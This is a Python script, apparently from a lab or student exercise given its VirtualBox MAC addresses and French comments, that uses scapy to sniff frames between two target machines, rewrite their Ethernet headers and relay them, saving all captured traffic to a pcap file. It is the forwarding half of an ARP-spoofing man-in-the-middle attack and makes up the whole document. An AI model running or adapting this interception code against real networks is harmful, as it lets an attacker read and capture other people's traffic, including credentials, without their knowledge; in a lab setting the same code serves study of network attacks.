import scapy.all as scapy
import asyncio
import threading
import remove_checksum

class Sniffer:
    def __init__(self, interface, mac_1, mac_2):
        self.interface = interface
        self.mac_1 = mac_1
        self.mac_2 = mac_2
        self.self_ip = scapy.get_if_addr(interface)
        self.self_mac = scapy.get_if_hwaddr(interface)
        #self.filtre = f"ether host {self.mac_1} and ether host {self.mac_2} and not host {self.self_ip} and not arp"
        #self.filtre = f"((ether src {self.mac_1} or ether src {self.mac_2}) or (ether dst {self.self_mac} and not dst host {self.self_ip})) and not arp"
        # On veut un paquet qui provient soit d'un client soit de l'autre, mais pas un paquet qui nous est destiné au niveau IP
        self.filtre = f"(ether src {self.mac_1} or ether src {self.mac_2}) and not dst host {self.self_ip} and not arp"
        self.capture = []

    def packet_tranfert(self, packet):
        if packet.haslayer(scapy.Ether):
            ether = packet.getlayer(scapy.Ether)
            # Si c'est la cible 1, on envoie à la cible 2
            # Si c'est la cible 2, on envoie à la cible 1
            if ether.src == self.mac_1: ether.dst = self.mac_2
            elif ether.src == self.mac_2: ether.dst = self.mac_1
            ether.src = self.self_mac # On met notre MAC comme source pour conserver la cohérence de la table ARP

            # TODO: gérer les paquets IP avec recalcul du checksum
            paquet = remove_checksum.remove_checksum(packet)
            scapy.sendp(paquet, iface=self.interface, verbose=False)

    def packet_callback(self, packet):
        print(packet.summary())
        self.capture.append(packet)
        self.packet_tranfert(packet)

    def sniffer_thread(self):
        scapy.sniff(iface=self.interface, filter=self.filtre, prn=self.packet_callback, store=False)

    async def start_sniffing(self):
        # capture = scapy.sniff(iface=self.interface, filter=self.filtre, prn=self.packet_callback, store=True)
        # scapy.wrpcap("sessions_sniffer.pcap", capture)

        self.thread = threading.Thread(target=self.sniffer_thread, daemon=True)
        self.thread.start()

        try:
            await asyncio.Event().wait()
        except asyncio.CancelledError:
            scapy.wrpcap("sessions_sniffer.pcap", self.capture)
            raise


async def main():
    s = Sniffer("bridge100", "08:00:27:07:78:aa", "08:00:27:74:d6:4d")
    await s.start_sniffing()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Arrêt demandé par l'utilisateur")